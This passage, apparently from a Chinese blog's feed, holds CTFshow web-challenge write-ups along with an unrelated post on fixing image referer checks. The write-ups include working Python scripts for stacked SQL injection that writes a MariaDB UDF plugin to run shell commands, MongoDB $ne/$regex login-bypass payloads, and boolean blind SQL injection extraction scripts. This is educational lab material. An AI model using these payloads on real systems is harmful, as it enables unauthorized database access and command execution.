class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#参考脚本</span><br><span class="line">#环境：Linux<span class="operator">/</span>MariaDB</span><br><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url<span class="operator">=</span><span class="string">&#x27;http://89a7098e-03f5-47f3-9cb5-1f1cd3d640e9.challenge.ctf.show:8080/api/?id=&#x27;</span></span><br><span class="line">code<span class="operator">=</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">codes<span class="operator">=</span>[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">0</span>,len(code),<span class="number">128</span>):</span><br><span class="line">    codes.append(code[i:<span class="built_in">min</span>(i<span class="operator">+</span><span class="number">128</span>,len(code))])</span><br><span class="line"> </span><br><span class="line">#建临时表</span><br><span class="line"><span class="keyword">sql</span><span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;create table temp(data longblob)&#x27;&#x27;&#x27;</span></span><br><span class="line">payload<span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;0&#x27;</span>;&#123;&#125;;<span class="comment">-- A&#x27;&#x27;&#x27;.format(sql)</span></span><br><span class="line">requests.get(url<span class="operator">+</span>payload)</span><br><span class="line"> </span><br><span class="line">#清空临时表</span><br><span class="line"><span class="keyword">sql</span><span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;delete from temp&#x27;&#x27;&#x27;</span></span><br><span class="line">payload<span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;0&#x27;</span>;&#123;&#125;;<span class="comment">-- A&#x27;&#x27;&#x27;.format(sql)</span></span><br><span class="line">requests.get(url<span class="operator">+</span>payload)</span><br><span class="line"> </span><br><span class="line">#插入第一段数据</span><br><span class="line"><span class="keyword">sql</span><span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;insert into temp(data) values (0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.format(codes[<span class="number">0</span>])</span><br><span class="line">payload<span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;0&#x27;</span>;&#123;&#125;;<span class="comment">-- A&#x27;&#x27;&#x27;.format(sql)</span></span><br><span class="line">requests.get(url<span class="operator">+</span>payload)</span><br><span class="line"> </span><br><span class="line">#更新连接剩余数据</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,len(codes)):</span><br><span class="line">    <span class="keyword">sql</span><span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;update temp set data = concat(data,0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.format(codes[k])</span><br><span class="line">    payload<span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;0&#x27;</span>;&#123;&#125;;<span class="comment">-- A&#x27;&#x27;&#x27;.format(sql)</span></span><br><span class="line">    requests.get(url<span class="operator">+</span>payload)</span><br><span class="line"> </span><br><span class="line">#<span class="number">10.3</span><span class="number">.18</span><span class="operator">-</span>MariaDB    </span><br><span class="line">#写入so文件</span><br><span class="line"><span class="keyword">sql</span><span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;select data from temp into dumpfile &#x27;</span><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>mariadb<span class="operator">/</span>plugin<span class="operator">/</span>udf.so\<span class="string">&#x27;&#x27;&#x27;&#x27;</span></span><br><span class="line">payload<span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;0&#x27;</span>;&#123;&#125;;<span class="comment">-- A&#x27;&#x27;&#x27;.format(sql)</span></span><br><span class="line">requests.get(url<span class="operator">+</span>payload)</span><br><span class="line"> </span><br><span class="line">#引入自定义函数</span><br><span class="line"><span class="keyword">sql</span><span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;create function sys_eval returns string soname &#x27;</span>udf.so\<span class="string">&#x27;&#x27;&#x27;&#x27;</span></span><br><span class="line">payload<span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;0&#x27;</span>;&#123;&#125;;<span class="comment">-- A&#x27;&#x27;&#x27;.format(sql)</span></span><br><span class="line">requests.get(url<span class="operator">+</span>payload)</span><br><span class="line"> </span><br><span class="line">#命令执行，结果更新到界面</span><br><span class="line"><span class="keyword">sql</span><span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;update ctfshow_user set pass=(select sys_eval(&#x27;</span>cat <span class="operator">/</span>flag.her?<span class="string">&#x27;))&#x27;&#x27;&#x27;</span></span><br><span class="line">payload<span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;0&#x27;</span>;&#123;&#125;;<span class="comment">-- A&#x27;&#x27;&#x27;.format(sql)</span></span><br><span class="line">requests.get(url<span class="operator">+</span>payload)</span><br><span class="line"> </span><br><span class="line">#查看结果</span><br><span class="line">r<span class="operator">=</span>requests.get(url[:<span class="number">-4</span>]<span class="operator">+</span><span class="string">&#x27;?page=1&amp;limit=10&#x27;</span>)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h1 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h1><blockquote><p><a href="http://rui0.cn/archives/609">http://rui0.cn/archives/609</a><br><a href="https://www.anquanke.com/post/id/97211">https://www.anquanke.com/post/id/97211</a><br><a href="https://gylq.gitee.io/2021/08/04/%E3%80%90MongoDB%E3%80%91%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/">https://gylq.gitee.io/2021/08/04/%E3%80%90MongoDB%E3%80%91%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/</a></p></blockquote><h2 id="nosql"><a href="#nosql" class="headerlink" title="nosql"></a>nosql</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">user</span> <span class="operator">=</span> $memcache<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">get</span>($id);</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">api<span class="operator">/</span>?id[]<span class="operator">=</span>flag</span><br></pre></td></tr></table></figure><h1 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  $query <span class="operator">=</span> <span class="keyword">new</span> MongoDB\Driver\Query($data);</span><br><span class="line">  $<span class="keyword">cursor</span> <span class="operator">=</span> $manager<span class="operator">-</span><span class="operator">&gt;</span>executeQuery(<span class="string">&#x27;ctfshow.ctfshow_user&#x27;</span>, $query)<span class="operator">-</span><span class="operator">&gt;</span>toArray();</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>无过滤</span><br><span class="line">  if(<span class="built_in">count</span>($<span class="keyword">cursor</span>)<span class="operator">&gt;</span><span class="number">0</span>)&#123;</span><br><span class="line">    $ret[<span class="string">&#x27;msg&#x27;</span>]<span class="operator">=</span><span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">    array_push($ret[<span class="string">&#x27;data&#x27;</span>], $flag);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$ne]<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password[$ne]<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>有的时候服务器会摆，重启一下试试</p><h1 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h1><p>post传入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$regex]<span class="operator">=</span>.<span class="operator">*</span><span class="operator">&amp;</span>password[$regex]<span class="operator">=</span>.<span class="operator">*</span></span><br></pre></td></tr></table></figure><h1 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$regex]<span class="operator">=</span>f.<span class="operator">*</span><span class="operator">&amp;</span>password[$ne]<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690559031690-d2869572-b4e7-4998-82b0-ac7e4a1077cc.png" alt="image.png"></p><h1 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h1><p>这里直接用别人的脚本了：<br>道理是相同的，一点点猜即可。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># <span class="comment">-- coding:UTF-8 --</span></span><br><span class="line"># Author:孤桜懶契</span><br><span class="line"># <span class="type">Date</span>:<span class="number">2021</span><span class="operator">/</span><span class="number">8</span><span class="operator">/</span><span class="number">4</span></span><br><span class="line"># blog: gylq.gitee.io</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url <span class="operator">=</span> &quot;http://a2efa0f0-f634-4621-bd4a-e96a4f1b0196.challenge.ctf.show:8080/api/&quot;</span><br><span class="line">str <span class="operator">=</span> &quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，&quot;</span><br><span class="line">flag <span class="operator">=</span> &quot;&quot;</span><br><span class="line"></span><br><span class="line">payload_user <span class="operator">=</span> &quot;flag.*&quot;</span><br><span class="line">payload_pass <span class="operator">=</span> &quot;^&#123;&#125;.*&quot;</span><br><span class="line"></span><br><span class="line">n <span class="operator">=</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data <span class="operator">=</span> &#123;</span><br><span class="line">            <span class="string">&#x27;username[$regex]&#x27;</span>:payload_user,</span><br><span class="line">            <span class="string">&#x27;password[$regex]&#x27;</span>:payload_pass.format(flag<span class="operator">+</span>j)</span><br><span class="line">        &#125;</span><br><span class="line">        res <span class="operator">=</span> requests.post(url <span class="operator">=</span> url, data<span class="operator">=</span>data)</span><br><span class="line">        if r&quot;\u767b\u9646\u6210\u529f&quot; <span class="keyword">in</span> res.text:</span><br><span class="line">            flag <span class="operator">+</span><span class="operator">=</span> j</span><br><span class="line">            n <span class="operator">+</span><span class="operator">=</span> <span class="number">1</span></span><br><span class="line">            print(<span class="string">&#x27;[*] 开始盲注第&#123;&#125;位&#x27;</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            if j <span class="operator">=</span><span class="operator">=</span> &quot;&#125;&quot;:</span><br><span class="line">                print(<span class="string">&#x27;[*] flag is &#123;&#125;&#x27;</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690559359451-1e99e676-d5bf-441a-9aa3-ead32343ea3f.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Python脚本修改语雀导文件图片格式(二)</title>
      <link href="/2023/07/14/%E4%BD%BF%E7%94%A8Python%E8%84%9A%E6%9C%AC%E4%BF%AE%E6%94%B9%E8%AF%AD%E9%9B%80%E5%AF%BC%E5%87%BAmd%E6%96%87%E4%BB%B6%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F(%E4%BA%8C)/"/>
      <url>/2023/07/14/%E4%BD%BF%E7%94%A8Python%E8%84%9A%E6%9C%AC%E4%BF%AE%E6%94%B9%E8%AF%AD%E9%9B%80%E5%AF%BC%E5%87%BAmd%E6%96%87%E4%BB%B6%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<p>如果你用了我之前发的脚本，你就会发现这个图片删后缀解析功能失效了。<br>不仅如此，以前用过生成的所有图片也失效了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689341771143-c9ff93d6-105e-4b66-843b-6a71055630dc.png" alt="image.png"><br>如果预览的话，会提示如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689341553395-02439fe9-4d5d-4472-addd-b145a50c68a5.png" alt="image.png"><br>但是当多次访问之后就会提示下载，但是图片仍然不会解析。<br>本来以为用不了了，打算搞个接口自己刷新，但是教程太乱了，而且感觉应该还有绕过的办法。<br>经过多次调试发现，这里有一个referer验证。<br>没有referer的访问是会被403的。<br>因此这个问题就变成了如何让访问具有referer验证，或者说不让他验证。<br>在网上查了很久发现一段代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=<span class="string">&quot;referrer&quot;</span> content=<span class="string">&quot;no-referrer&quot;</span> /&gt;</span><br></pre></td></tr></table></figure><p>用它来拒绝referer的请求。原文提示说，需要放在主题文件下的post.ejs文件。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689341855216-ca39347e-3323-48e1-8f30-3c30a27f6efd.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689341886707-ad13d3bd-e38d-4ca6-8f99-950d29a7933b.png" alt="image.png"><br>如果到这里，你的博客正好有<code>.ejs</code>文件。那就少了很多折腾。<br>以我的为例（butterfly）这个主题文件下的内容全是以<code>.pug</code>格式为后缀，<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689341987132-603e1d10-1028-495d-b11c-7f6ff6dc77fd.png" alt="image.png"><br>因此，原封不动照抄是会一片红的。<img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689342102855-d9c2abd5-2686-4a18-b042-81261ab1a39a.png" alt="image.png"><br>研究了挺长时间，找了找语法，得到了一种修改办法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meta(name=<span class="string">&quot;referrer&quot;</span>, content=<span class="string">&quot;no-referrer&quot;</span>)</span><br></pre></td></tr></table></figure><p>将其修改成对应语法，并且塞到某一个位置。注意，这行代码在不同位置，可能会导致你的博客排版错误。<br>我放在了<code>themes\butterfly\layout</code>下的post.pug，并置于：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689342167433-b44c1209-5565-4bdd-9140-991addb4bdeb.png" alt="image.png"><br>再说一遍，这行代码在不同位置，可能会导致你的博客排版错误。这里是我试过不会排版错误，而且能重新拉取到图片的地方。<br>保存之后，运行以下命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure><p>查看本地；拉取效果。<br>如果重新出现图片，就说明拉取成功了，deploy到远端即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689342465833-28799703-6b56-49d7-af39-bd43bd76e6ce.png" alt="image.png"></p><h2 id="已经有了更好的办法"><a href="#已经有了更好的办法" class="headerlink" title="已经有了更好的办法"></a>已经有了更好的办法</h2><p>之前按这样改，会出现进入页面还是损坏图片，但是点击获取一下，再刷新页面就会正常获取图片。<br>思考了一下，这不就说明引用条件太晚了，图片已经被请求过了。<br>那我就有个想法，直接改到引用比较靠前的文件中去，比如说：<br><code>\themes\butterfly\layout\includes</code>文件夹下的<code>layout.pug</code>在这个文件中写。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689343646123-2d3213ae-5535-4e76-b193-2df07d9aa8b4.png" alt="image.png"><br>保存刷新一下，发现已经可用了。进入加载页面就可以显示图片了。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>如果修改之后还没显示，清除cookie刷新一下试试，如果还不行，那就只能自己再想办法了。改过好几个了，应该还能挺一段时间。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脚本 </tag>
            
            <tag> Shortcut </tag>
            
            <tag> 语雀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web191-web213SQL注入篇（二）</title>
      <link href="/2023/07/12/web191-web213SQL%E6%B3%A8%E5%85%A5%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2023/07/12/web191-web213SQL%E6%B3%A8%E5%85%A5%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h1><p>跟上题一样，由于换了一章，就重新叙述一下。<br>布尔盲注需要先找到一个可改变的注入点。<br>比如：</p><ul><li><code>admin&#39; and 0#</code>时返回的是用户名不存在</li><li><code>admin&#39; and 1#</code>返回的是密码错误</li></ul><p>由此编写脚本：这题还是用是190的脚本即可<br>直接使用paayload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL布尔盲注2.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/11 22:02   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://cc8108f9-dbcc-44a5-aba7-90536cd74d69.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_ -&#125;&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(substr(database(),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;admin&#x27;and+if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload.<span class="built_in">format</span>(i, j),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="comment"># print(r.json()[&#x27;msg&#x27;])</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;密码错误&#x27;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><h1 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//TODO:感觉少了个啥，奇怪</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file|into|ascii|ord|hex/i&#x27;</span>, $username))&#123;</span><br><span class="line">        $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">        die(json_encode($ret));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可惜对我没用，我这里没用ascii做，前面几个可以结合ascii和二分法结合查找，wp写的很巧妙。<br>比如：<code>if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),1)</code><br>还是使用上题的脚本。</p><h1 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h1><h3 id="substr过滤可以使用mid、left、right来代替"><a href="#substr过滤可以使用mid、left、right来代替" class="headerlink" title="substr过滤可以使用mid、left、right来代替"></a>substr过滤可以使用mid、left、right来代替</h3><p>把substr过滤了，根据网上所说，可以用这几个来实现相同操作：<br>先来介绍一下几个函数用法，以下由gpt输出。</p><ol><li>MID函数：<ul><li>MID(string, start, length)：从指定的字符串中提取一个子字符串。它接受三个参数：<ul><li>string：要提取子字符串的源字符串。</li><li>start：指定要开始提取的位置的索引。索引从1开始。</li><li>length：指定要提取的子字符串的长度。</li></ul></li></ul><ol><li>例如，假设有一个字符串’Hello, World!’，你可以使用MID函数提取其中的子字符串，如下所示：</li></ol><ul><li>MID(‘Hello, World!’, 1, 5)：提取从索引位置1开始的5个字符，结果为’Hello’。</li></ul></li><li>LEFT函数：<ul><li>LEFT(string, length)：从指定的字符串的开头提取一个子字符串。它接受两个参数：<ul><li>string：要提取子字符串的源字符串。</li><li>length：指定要提取的子字符串的长度。</li></ul></li></ul><ol><li>例如，假设有一个字符串’Hello, World!’，你可以使用LEFT函数提取其中的子字符串，如下所示：</li></ol><ul><li>LEFT(‘Hello, World!’, 5)：提取开头的5个字符，结果为’Hello’。</li></ul></li><li>RIGHT函数：<ul><li>RIGHT(string, length)：从指定的字符串的末尾提取一个子字符串。它接受两个参数：<ul><li>string：要提取子字符串的源字符串。</li><li>length：指定要提取的子字符串的长度。</li></ul></li></ul><ol><li>例如，假设有一个字符串’Hello, World!’，你可以使用RIGHT函数提取其中的子字符串，如下所示：</li></ol><ul><li>RIGHT(‘Hello, World!’, 6)：提取末尾的6个字符，结果为’World!’。</li></ul></li></ol><p>这里用mid即可，稍作修改脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL布尔盲注2.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/11 22:02   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://b40c977f-1bc2-4d31-97ee-da13510260aa.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_ -&#125;&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(mid(database(),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;admin&#x27;and+if(mid((select group_concat(f1ag) from ctfshow_flxg),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload.<span class="built_in">format</span>(i, j),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="comment"># print(r.json()[&#x27;msg&#x27;])</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;密码错误&#x27;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><p>但是这里还是简单提一下left和right这里的写法：<br>right<br>从右边开始截取,配合ascii使用.<br>ascii(‘str’)返回字符串的第一个字符的ascii码<br>ascii(right(‘abc’,2))= 97相当于 ascii(‘bc’)=97<br>left<br>从左边开始截取,用reverse反转<br>ascii(reverse(left(‘abc’,2))) = 97 相当于 